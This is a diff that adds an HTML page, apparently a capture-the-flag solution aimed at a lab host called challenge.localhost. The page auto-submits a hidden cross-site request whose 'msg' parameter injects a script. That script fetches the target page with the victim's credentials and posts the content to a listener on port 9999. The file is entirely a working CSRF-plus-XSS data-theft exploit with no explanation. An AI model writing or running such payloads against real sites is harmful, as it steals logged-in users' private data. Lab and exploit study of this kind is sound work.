@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="csrf-form" action="http://challenge.localhost/ephemeral" method="GET">
+      <input type="hidden" name="msg" value="<script>fetch('http://challenge.localhost:80/', { method: 'GET', credentials: 'include' }).then(response => response.text()).then(data => { fetch('http://localhost:9999/', { method: 'POST', body: data, headers: { 'Content-Type': 'text/plain' } }); }).catch(error => console.error('Error fetching:', error));</script>">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
